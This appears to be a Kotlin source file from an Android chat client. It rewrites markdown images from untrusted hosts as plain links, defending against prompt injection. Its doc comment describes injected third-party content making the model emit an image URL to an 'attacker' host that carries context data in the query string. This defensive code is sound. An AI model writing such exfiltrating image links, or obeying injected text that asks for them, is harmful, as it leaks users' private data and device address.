package com.garfiec.librechat.core.ui.markdown

import androidx.compose.runtime.staticCompositionLocalOf

/**
 * The hosts whose images a message may fetch on its own: the platform's (26/10/2026, the review).
 * Empty, nothing remote loads by itself.
 *
 * Why: the agent reads third parties (the web, mails, messages through the annuaire). A trapped
 * content can make the model write `![x](https://attacker/p.png?d=<what it knows>)`, and the phone
 * used to send that request at the first draw, with no gesture: a channel out for anything in the
 * context, plus the phone's address. An image off the platform is shown as a link the person may
 * open on purpose; a `data:` image and a platform image draw as before.
 */
val LocalTrustedImageHosts = staticCompositionLocalOf<Set<String>> { emptySet() }

private val MARKDOWN_IMAGE_REGEX = Regex("""!\[([^\]]*)]\(\s*<?([^)\s>]+)>?(\s+"[^"]*")?\s*\)""")

/** [markdown] with every image off [trustedHosts] turned into a plain link, `[alt (image)](url)`. */
fun imagesOffTrustedHostsAsLinks(markdown: String, trustedHosts: Set<String>): String {
    if ('!' !in markdown) return markdown
    return MARKDOWN_IMAGE_REGEX.replace(markdown) { match ->
        val alt = match.groupValues[1].trim()
        val url = match.groupValues[2]
        if (imageLoadsOnItsOwn(url, trustedHosts)) {
            match.value
        } else {
            "[${alt.ifEmpty { "image" }} (image)]($url)"
        }
    }
}

/** True for a `data:` image and for one hosted on the platform. */
fun imageLoadsOnItsOwn(url: String, trustedHosts: Set<String>): Boolean {
    val trimmed = url.trim()
    if (trimmed.startsWith("data:", ignoreCase = true)) return true
    val host = hostOnly(trimmed) ?: return false
    return trustedHosts.any { hostOnly(it) == host }
}

/** `https://user@Agent.Example:4096/x` → `agent.example`; a bare `host:port` works too. */
private fun hostOnly(address: String): String? {
    val afterScheme = address.trim().substringAfter("://", missingDelimiterValue = address.trim())
    val authority = afterScheme.takeWhile { it != '/' && it != '?' && it != '#' }.substringAfterLast('@')
    val host = if (authority.startsWith("[")) {
        authority.substringAfter('[').substringBefore(']')
    } else {
        authority.substringBefore(':')
    }
    return host.lowercase().takeIf { it.isNotEmpty() }
}
